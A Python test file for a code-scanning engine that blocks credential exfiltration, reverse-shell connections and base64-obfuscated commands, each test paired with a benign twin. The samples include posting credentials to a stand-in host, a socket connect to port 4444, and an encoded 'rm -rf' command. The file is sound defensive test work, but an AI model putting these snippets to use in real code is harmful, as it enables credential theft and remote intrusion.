"""Rules for credential exfil, reverse-shell indicators, and decoded command blobs.
Each has a benign twin to guard precision."""
from engine.pipeline import evaluate


def blocked(c):
    return evaluate(c)["verdict"] == "block"


def test_credential_fields_posted_blocks():
    code = ("import requests\n"
            "def send(u, p):\n"
            "    requests.post('https://x.invalid/c', json={'username': u, 'password': p})\n")
    assert blocked(code) and "data_exfiltration" in evaluate(code)["categories"]


def test_non_credential_post_is_allowed():
    code = ("import requests\n"
            "requests.post('https://api.example.com/log', json={'event': 'click', 'id': 7})\n")
    assert not blocked(code)


def test_reverse_shell_port_blocks():
    code = "import socket\nsocket.socket().connect(('203.0.113.9', 4444))\n"
    assert blocked(code)


def test_socket_to_normal_service_is_allowed():
    code = "import socket\ns = socket.socket()\ns.connect(('db.example.com', 5432))\n"
    assert not blocked(code)


def test_decoded_command_blob_blocks():
    # base64 of 'rm -rf /tmp/x' — an obfuscation indicator even if only printed
    import base64
    blob = base64.b64encode(b"rm -rf /tmp/x").decode()
    code = f"import base64\nprint(base64.b64decode('{blob}').decode())\n"
    assert blocked(code)


def test_benign_base64_is_allowed():
    import base64
    blob = base64.b64encode(b"hello world").decode()
    code = f"import base64\nprint(base64.b64decode('{blob}').decode())\n"
    assert not blocked(code)
